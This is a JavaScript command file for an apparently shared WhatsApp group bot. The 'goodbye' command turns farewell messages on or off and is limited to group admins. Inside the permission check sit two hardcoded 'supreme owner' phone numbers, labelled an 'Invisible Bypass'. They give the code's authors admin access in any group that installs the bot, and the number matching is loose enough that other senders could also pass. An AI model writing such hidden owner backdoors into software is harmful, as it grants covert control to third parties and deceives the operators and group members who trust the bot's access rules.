/**
 * Goodbye - Enable/disable goodbye messages
 * GhostG-X Edition
 * Sécurité : Supreme Owner Master Access (Invisible Bypass)
 */

const db = require('../../database');
const config = require('../../config.js');

// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

const prefix = config.prefix || '.';

module.exports = {
  name: 'goodbye',
  aliases: ['goodbyeon', 'goodbyeoff', 'byeon', 'byeoff'],
  category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
  description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴀᴄᴛɪᴠᴇ ᴏᴜ ᴅᴇsᴀᴄᴛɪᴠᴇ ʟᴇs ᴍᴇssᴀɢᴇs ᴅ\'ᴀᴅɪᴇᴜ',
  usage: `${prefix}goodbye <on/off>`, // 💡 Dynamique avec ton préfixe actuel
  groupOnly: true,
  adminOnly: true,
  botAdminNeeded: true,

  async execute(sock, msg, args, extra) {
    const { reply } = extra;

    try {
      const senderJid = msg.key.participant || msg.key.remoteJid;
      const senderNumber = senderJid.replace(/\D/g, '');

      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise)
      const supremeOwners = ['22651622652', '22665107481'];
      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));

      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
        const cleanN = String(n).replace(/\D/g, '');
        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
      });

      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;

      // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
      if (!extra.isAdmin && !isMe) {
        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

      const groupId = extra.from;
      const action = args[0]?.toLowerCase();
      const groupSettings = db.getGroupSettings(groupId);

      if (!action || !['on', 'off'].includes(action)) {
        const status = groupSettings.goodbye ? 'ON' : 'OFF';

        return reply(
          `*╭╼━━━≪• sᴛᴀᴛᴜᴛ ᴀʀᴄᴀɴᴇ_ɢᴏᴏᴅʙʏᴇ •≫━━━╾╮*\n` +
          `*┃* 🔮 *${toSmallCaps('etat')} :* [ ${status} ]\n\n` +
          `*┃* 🔮 *${toSmallCaps('incantations disponibles')} :*\n` +
          `*┃* *${toSmallCaps('cet arcane affiche l adieu et la stele')}*\n` +
          `*┃* *${toSmallCaps('des membres quittant le sanctuaire')}.*\n\n` +
          `  ${prefix}goodbye on\n` +
          `  ${prefix}goodbye off\n\n` +
          `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
        );
      }

      const enable = action === 'on';

      if (enable && groupSettings.goodbye) {
        return reply(`*⚠️ ${toSmallCaps('l arcane goodbye est deja actif')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

      if (!enable && !groupSettings.goodbye) {
        return reply(`*⚠️ ${toSmallCaps('l arcane goodbye est deja endormi')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

      db.updateGroupSettings(groupId, { goodbye: enable });

      if (enable) {
        return reply(`*✅ ${toSmallCaps('l arcane goodbye a ete eveille avec succes')} !*\n\n_ʟᴇs ᴀ̂ᴍᴇs ǫᴜɪᴛᴛᴀɴᴛ ʟᴇ ɢʀᴏᴜᴘᴇ ʀᴇᴄᴇᴠʀᴏɴᴛ ʟᴇᴜʀ sᴛᴇ̀ʟᴇ ғᴜɴᴇ́ʀᴀɪʀᴇ._\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      } else {
        return reply(`*❌ ${toSmallCaps('l arcane goodbye a ete desactive')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

    } catch (error) {
      console.error('Goodbye Error:', error);
      await reply(`*❌ ${toSmallCaps('l invocation a echoue')} : ${error.message}*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
    }
  }
};
